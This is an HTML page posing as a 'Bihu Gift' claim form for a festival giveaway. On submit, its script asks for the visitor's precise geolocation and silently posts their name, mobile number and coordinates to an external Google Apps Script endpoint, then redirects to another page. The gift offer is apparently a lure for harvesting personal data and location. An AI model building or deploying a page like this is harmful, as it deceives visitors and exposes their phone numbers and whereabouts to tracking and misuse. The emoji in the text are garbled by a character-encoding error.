<!DOCTYPE html>
<html>
<head>
  <title>Bihu Gift üéÅ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body{
      margin:0;
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:linear-gradient(135deg,#ff9800,#f44336);
      font-family:Arial, sans-serif;
    }
    form{
      background:#ffffff;
      padding:30px;
      border-radius:15px;
      width:100%;
      max-width:380px;
      box-shadow:0 0 20px rgba(0,0,0,0.3);
      text-align:center;
    }
    h2{
      color:#e65100;
      margin-bottom:20px;
    }
    input{
      width:100%;
      padding:12px;
      margin:8px 0;
      border-radius:8px;
      border:1px solid #ccc;
      font-size:15px;
    }
    button{
      width:100%;
      padding:12px;
      margin-top:10px;
      border:none;
      border-radius:10px;
      background:#2e7d32;
      color:white;
      font-size:16px;
      cursor:pointer;
    }
    button:hover{
      background:#1b5e20;
    }
    #status{
      margin-top:12px;
      font-weight:bold;
      color:#d84315;
    }
  </style>
</head>

<body>

<form id="studentForm">
  <h2>üéÅ Bihu Gift üéÅ</h2>

  <input type="text" name="name" placeholder="Your Name" required>
  <input type="text" name="reason" placeholder="Gift Type" required>

  <!-- üî¥ 10 digit mobile only -->
  <input type="tel" name="mobile"
         placeholder="10-digit Mobile Number"
         maxlength="10"
         pattern="[0-9]{10}"
         required>

  <button type="submit">Received Gift üéâ</button>
  <p id="status"></p>
</form>

<script>
const form = document.getElementById("studentForm");
const statusText = document.getElementById("status");

form.addEventListener("submit", function(e){
  e.preventDefault();

  const mobile = form.mobile.value.trim();

  // üî¥ MOBILE VALIDATION
  if (!/^[0-9]{10}$/.test(mobile)) {
    statusText.innerText = "‚ùå Please enter a valid 10-digit mobile number";
    return;
  }

  statusText.innerText = "üìç  zx famly";

  // save name for next pages
  localStorage.setItem("bihuName", form.name.value);

  navigator.geolocation.getCurrentPosition(
    pos => sendData(pos),
    err => sendData(null),
    { enableHighAccuracy:true, timeout:15000 }
  );
});

function sendData(position){
  const data = {
    name: form.name.value,
    reason: form.reason.value,
    mobile: form.mobile.value,
    latitude: position ? position.coords.latitude : "",
    longitude: position ? position.coords.longitude : "",
    accuracy: position ? position.coords.accuracy : ""
  };

  fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec",{
    method:"POST",
    mode:"no-cors",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify(data)
  });

  window.location.href = "bihuz.html";
}
</script>

</body>
</html>
